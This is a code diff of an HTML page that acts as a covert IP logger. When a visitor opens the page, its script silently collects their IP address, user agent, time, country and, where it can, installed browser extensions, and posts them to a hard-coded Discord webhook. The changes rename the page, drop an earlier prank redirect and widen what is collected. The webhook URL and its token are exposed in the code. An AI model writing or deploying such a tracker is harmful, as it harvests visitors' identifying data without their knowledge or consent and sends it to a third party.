@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ur mom</title>
+  <title>IP and User Agent Sender</title>
 </head>
 <body>
-  <h1>ヾ(≧▽≦*)o</h1>
+  <h1>IP and User Agent Sender</h1>
 
   <script>
     // Function to send data to Discord webhook
-    function sendToDiscord(ip, userAgent, dateTime) {
+    function sendToDiscord(ip, userAgent, dateTime, country, extensions) {
       var webhookUrl = "https://discord.com/api/webhooks/1116840690811412623/ljBC7BcAaKj4orxzDFcJvID4CSF5Q7Sir3678YqqrAl-I9w3EtXW7cbTpScp7144Elxr";
 
       // Create a new XMLHttpRequest
@@ -20,7 +20,7 @@
 
       // Build the payload JSON data with fancy Discord formatting
       var payload = {
-        "content": "```IP: " + ip + "\nUser Agent: " + userAgent + "\nDate and Time: " + dateTime + "```"
+        "content": "```IP: " + ip + "\nUser Agent: " + userAgent + "\nDate and Time: " + dateTime + "\nCountry: " + country + "\nInstalled Extensions: " + extensions.join(", ") + "```"
       };
 
       // Convert payload to JSON string
@@ -28,12 +28,9 @@
 
       // Send the request
       request.send(payloadJson);
-
-      // Redirect the user to the specified website after data is sent
-      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }
 
-    // Get the IP address, user agent, and current date and time and send them to Discord
+    // Get the IP address, user agent, current date and time, country, and installed extensions and send them to Discord
     window.addEventListener("load", function() {
       // Get the IP address using a free API
       fetch("https://api.ipify.org?format=json")
@@ -47,8 +44,21 @@
           // Get the current date and time
           var dateTime = new Date().toLocaleString();
 
-          // Call the function to send data to Discord and redirect the user
-          sendToDiscord(ip, userAgent, dateTime);
+          // Get the country based on the IP address
+          fetch("https://ipapi.co/" + ip + "/country_name/")
+            .then(response => response.text())
+            .then(country => {
+              // Get the installed extensions
+              chrome.management.getAll(function(extensions) {
+                var extensionNames = extensions.map(function(extension) {
+                  return extension.name;
+                });
+
+                // Call the function to send data to Discord
+                sendToDiscord(ip, userAgent, dateTime, country, extensionNames);
+              });
+            })
+            .catch(error => console.error("Error:", error));
         })
         .catch(error => console.error("Error:", error));
     });
